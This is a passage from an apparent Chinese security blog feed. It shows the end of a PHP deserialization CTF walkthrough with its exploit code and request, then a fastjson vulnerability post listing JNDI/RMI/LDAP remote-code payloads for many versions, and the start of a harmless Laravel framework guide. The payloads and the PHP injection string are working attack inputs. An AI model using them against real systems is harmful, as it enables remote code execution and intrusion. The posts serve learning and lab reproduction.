class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">object(a)#1 (3) &#123;</span><br><span class="line">  [&quot;u&quot;]&#x3D;&gt;</span><br><span class="line">  string(27) &quot;challengechallengechallenge&quot;</span><br><span class="line">  [&quot;uname&quot;]&#x3D;&gt;</span><br><span class="line">  string(52) &quot;&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">&#125;</span><br><span class="line">string(150) &quot;O:1:&quot;a&quot;:3:&#123;s:1:&quot;u&quot;;s:27:&quot;challengechallengechallenge&quot;;s:5:&quot;uname&quot;;s:52:&quot;&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&quot;</span><br><span class="line">string(123) &quot;O:1:&quot;a&quot;:3:&#123;s:1:&quot;u&quot;;s:27:&quot;&quot;;s:5:&quot;uname&quot;;s:52:&quot;&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&quot;</span><br><span class="line">bool(false)</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第二个是过滤后序列化结果，$u 传入3个challenge长度为27，因为filter函数将challenge变为空，导致$u结果成为：<code>&quot;;s:5:&quot;uname&quot;;s:52:&quot;</code> 只有20个字符长度，</p><p>所以$uname需要随机多加7个字符填充</p><p> 即：<code>xxxxxxx&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code></p><p>调试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/8 15:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $u;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$u,$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;u = $u;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public function __wakeup()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        if($this-&gt;password===&#x27;easy&#x27;)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            include(&#x27;flag.php&#x27;);</span></span><br><span class="line"><span class="comment">//            echo $flag;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            echo &#x27;wrong password&#x27;;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$u=<span class="string">&#x27;challengechallengechallenge&#x27;</span>;</span><br><span class="line">$uname = <span class="string">&#x27;xxxxxxx&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#x27;</span>;</span><br><span class="line">$password = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">$s = <span class="keyword">new</span> a($u,$uname,$password);</span><br><span class="line">var_dump($s);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($s));</span><br><span class="line"></span><br><span class="line">var_dump(filter(serialize($s)));</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(filter(serialize($s))))</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515164805871.png" alt="image-20220515164805871"></p><p>发送请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:20001&#x2F;5.php&#x2F;?u&#x3D;challengechallengechallenge&amp;uname&#x3D;aaaaaaa&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515161717719.png" alt="image-20220515161717719"></p><p>参考：</p><p><a href="https://blog.csdn.net/m0_57497184/article/details/123490870">https://blog.csdn.net/m0_57497184/article/details/123490870</a></p><p><a href="https://cloud.tencent.com/developer/article/1627299">https://cloud.tencent.com/developer/article/1627299</a></p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;ctf中的php反序列化&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;序列化 即使用&lt;code&gt;serialize();&lt;/code&gt;将类的对象的数据用字符串方式进行表示&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;反序列化 即使用&lt;code&gt;unserialize();&lt;/code&gt;来读取 序列化格式的数据&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用序列化和反序列化 主要是方便数据的存储和数据的转换读取。&lt;/p&gt;</summary>
    
    
    
    <category term="php" scheme="http://example.com/categories/php/"/>
    
    
    <category term="php反序列化" scheme="http://example.com/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>fastjson漏洞</title>
    <link href="http://example.com/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-04-17T11:05:31.000Z</published>
    <updated>2022-04-22T02:26:56.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>fastjson是alibaba开源的一个json解析库，将java对象和JSON格式字符相互转换。 </p><p>jackson也有这样类似功能。Spring MVC 默认采用Jackson解析Json</p><p><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><h3 id="原理解释："><a href="#原理解释：" class="headerlink" title="原理解释："></a>原理解释：</h3><p>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从</p><p>而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据</p><p>这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>配置环境配了两个小时。。。各种报错</p><p>maven环境：<a href="http://maven.apache.org/download.cgi">http://maven.apache.org/download.cgi</a></p><p>idea 创建maven 项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pom.xml引入fastjson依赖</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.62&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>然后处理各种报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pom.xml 加入</span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;defaultGoal&gt;compile&lt;&#x2F;defaultGoal&gt;.</span><br><span class="line">&lt;&#x2F;build&gt;</span><br></pre></td></tr></table></figure><p>然后配置tomcat:<a href="https://tomcat.apache.org/download-90.cgi">Apache Tomcat® - Apache Tomcat 9 Software Downloads</a></p><p>Edit Configurations 配置：</p><p><img src="/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/image-20220417224659876.png" alt="image-20220417224659876"></p><p>然后配置Project Structure ：<a href="https://blog.csdn.net/weixin_44579869/article/details/121647812">(28条消息) IDEA出现Please,configure Web Facet first的解决方式，或者是Servlet启动后 404_扶她小藜的博客-CSDN博客_idea please</a></p><p>参考：<a href="https://blog.csdn.net/lchmyhua88/article/details/116535988">(28条消息) 在IDEA中创建maven项目，使用Fastjson 介绍json转换_华大哥的博客-CSDN博客_fastjson idea</a></p><p>复现log4j2 的时候也用到了下面两个请求方式</p><h3 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h3><h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><h1 id="Fastjson-多版本payload集合"><a href="#Fastjson-多版本payload集合" class="headerlink" title="Fastjson 多版本payload集合"></a>Fastjson 多版本payload集合</h1><p>copy的零组文库</p><p>影响版本：</p><h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1099/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1098/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://x.x.x.x:1999/Exploit&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="attr">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1098/exploit&quot;</span>&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="attr">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="attr">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="attr">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="attr">&quot;properties&quot;</span>: &#123;</span><br></pre></td></tr></table></figure><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p><a href="https://www.sec-in.com/article/950">浅谈fastjson waf Bypass思路-SecIN (sec-in.com)</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/safe6Sec/Fastjson">safe6Sec/Fastjson: Fastjson姿势技巧集合 (github.com)</a></p><p><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>零组文库</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;fastjson是alibaba开源的一个json解析库，将java对象和JSON格式字符相互转换。 &lt;/p&gt;
&lt;p&gt;jackson也有这样</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="fastjson" scheme="http://example.com/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>Laravel</title>
    <link href="http://example.com/2022/04/04/Laravel/"/>
    <id>http://example.com/2022/04/04/Laravel/</id>
    <published>2022-04-04T05:05:13.000Z</published>
    <updated>2022-04-17T08:30:42.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Laravel 是一个 Web应用框架，php作为底层语言，能够有很好的扩展，拥有比较完善的软件包。</p><p>3大核心：路由，控制器，视图</p><p>中文官方：<strong><a href="https://learnku.com/docs/laravel/8.x">https://learnku.com/docs/laravel/8.x</a></strong></p><a id="more"></a><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ol><li>composer下载 ：<a href="https://getcomposer.org/download/">https://getcomposer.org/download/</a></li></ol><p>安装目录下执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo @php &quot;%~dp0composer.phar&quot; %*&gt;composer.bat</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">composer -V</span><br><span class="line"></span><br><span class="line">换源</span><br><span class="line">国内：</span><br><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.phpcomposer.com</span></span><br><span class="line">或</span><br><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.laravel-china.org  （这个可能有时会报错）</span></span><br><span class="line"></span><br><span class="line">国外官方：</span><br><span class="line">composer config -g repo.packagist composer https://packagist.org </span><br></pre></td></tr></table></figure><ol start="2"><li>从<a href="https://laravelacademy.org/post/2%E4%B8%8B%E8%BD%BD%E6%A1%86%E6%9E%B6">https://laravelacademy.org/post/2下载框架</a></li></ol><p>或者</p><p>利用composer直接下载，在phpstudy 的www目录下执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist  laravel&#x2F;laravel laravel8  #创建laravel8文件，将框架下载到其中，不指定版本</span><br><span class="line"></span><br><span class="line">composer create-project --prefer-dist  laravel&#x2F;laravel laravel 7.x #指定版本</span><br></pre></td></tr></table></figure><p><img src="/2022/04/04/Laravel/image-20220404135443531.png" alt="image-20220404135443531"></p><p>phpstudy 配置：设置根目录到为public<br><img src="/2022/04/04/Laravel/image-20220404135516295.png" alt="image-20220404135516295"></p><p>访问如下图</p><p><img src="/2022/04/04/Laravel/image-20220404135640257.png" alt="image-20220404135640257"></p><p>以下代码分析均为<code>laravel8.83.6 </code>框架，目前laravel框架已经更新到9.x了</p><h1 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h1><p><a href="https://learnku.com/docs/laravel/8.x/structure/9356">https://learnku.com/docs/laravel/8.x/structure/9356</a></p><p>主要目录分析</p><p><img src="/2022/04/04/Laravel/image-20220404150632990.png" alt="image-20220404150632990"></p><h3 id="app"><a href="#app" class="headerlink" title="app"></a>app</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">整个laravel最主要部分，主要代码都在app目录下完成，包含了mvc三大模块</span><br></pre></td></tr></table></figure><p><img src="/2022/04/04/Laravel/image-20220404151946298.png" alt="image-20220404151946298"></p><ul><li>/app/Http</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包含控制器，中间件，表单请求等，几乎所有请求处理都在这里</span><br></pre></td></tr></table></figure><p><img src="/2022/04/04/Laravel/image-20220404153320786.png" alt="image-20220404153320786"></p><ul><li>/app/Models</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包含Eloquent 等模型文件，用于处理数据库操作实现。每个表都有对应的model类，通过模型方法进行数据表的增删改查。</span><br></pre></td></tr></table></figure><ul><li>/app/Http/Controllers/</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制器用于将相关的 HTTP 请求封装到一个类中进行处理，如同TP6一样，默认情况下，控制器没有分组，默认都存放在 app&#x2F;Http&#x2F;Controllers 目录下。</span><br></pre></td></tr></table></figure><p>控制器有类似tp的目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app</span><br><span class="line">├─Http </span><br><span class="line">│  ├─Controllers  控制器目录</span><br><span class="line">│  │  ├─admin  后台Admin模块</span><br><span class="line">│  │  │  ├─IndexController.php 后台首页控制器</span><br><span class="line">│  │  │  ├─CategoryController.php 分类管理控制器</span><br><span class="line">│  │  ├─home   前台Home模块</span><br><span class="line">│  │  │  ├─IndexController.php 前台首页控制器</span><br><span class="line">│  │  │  ├─ArticleController.php 文章展示控制器</span><br><span class="line">│  │  ├─user   用户User模块</span><br><span class="line">│  │  │  ├─IndexController.php 用户首页控制器</span><br><span class="line">│  │  │  ├─TagController.php 标签管理控制器</span><br></pre></td></tr></table></figure><h3 id="bootstrap"><a href="#bootstrap" class="headerlink" title="bootstrap"></a>bootstrap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存放所有的第三方代码，包括框架函数源码（&#x2F;vendor&#x2F;laravel）、插件和扩展等。</span><br></pre></td></tr></table></figure><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网站入口，存放对外开放的资源目录，</span><br></pre></td></tr></table></figure><p><img src="/2022/04/04/Laravel/image-20220404154958546.png" alt="image-20220404154958546"></p><h3 id="database"><a href="#database" class="headerlink" title="database"></a>database</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据库操作相关文件（数据库迁移和数据填充）</span><br></pre></td></tr></table></figure><p><img src="/2022/04/04/Laravel/image-20220404155250445.png" alt="image-20220404155250445"></p><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php进入程序请求的入口， 同时包含前端控制器和资源相关文件</span><br></pre></td></tr></table></figure><p><img src="/2022/04/04/Laravel/image-20220404155516021.png" alt="image-20220404155516021"></p><h3 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">资源文件,前端显示内容，通常利用路由调用views里面的文件进行显示</span><br><span class="line"></span><br><span class="line">views 一般以xx.blade.php命名，</span><br></pre></td></tr></table></figure><p><img src="/2022/04/04/Laravel/image-20220404155645046.png" alt="image-20220404155645046"></p><h3 id="routes"><a href="#routes" class="headerlink" title="routes"></a>routes</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过配置路由，进行资源的访问，请求，页面的显示等</span><br><span class="line"></span><br><span class="line">web.php 文件包含 RouteServiceProvider 放置在 web 中间件组中的路由，后者提供会话状态、CSRF 保护和 cookie 加密。如果您的应用程序不提供无状态的 RESTful API，那么您的所有路由都很可能在 web.php 文件。</span><br><span class="line"></span><br><span class="line">api.php 文件包含 RouteServiceProvider 放置在 api 中间件组中的路由，后者提供速率限制。这些路由是无状态的，因此通过这些路由进入应用程序的请求将通过令牌进行身份验证，并且不能访问会话状态。</span><br><span class="line"></span><br><span class="line">console.php 文件是您可以定义所有基于闭包的控制台命令的地方。每个闭包都绑定到一个命令实例，允许使用一种简单的方法与每个命令的进行 IO 交互。尽管这个文件没有定义 HTTP 路由，但是它定义了应用程序中基于控制台的入口点（路由）。</span><br><span class="line"></span><br><span class="line">channels.php 文件是您可以注册应用程序支持的所有事件广播频道的位置。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/04/04/Laravel/image-20220405005017795.png" alt="image-20220405005017795"></p><h3 id="storage"><a href="#storage" class="headerlink" title="storage"></a>storage</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编译后的视图、基于会话、文件缓存和其它框架生成的文件</span><br></pre></td></tr></table></figure><p><img src="/2022/04/04/Laravel/image-20220404155731350.png" alt="image-20220404155731350"></p><p>​    </p><h3 id="texts"><a href="#texts" class="headerlink" title="texts"></a>texts</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">应用测试相关文件</span><br></pre></td></tr></table></figure><h3 id="vendor"><a href="#vendor" class="headerlink" title="vendor"></a>vendor</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要调用的 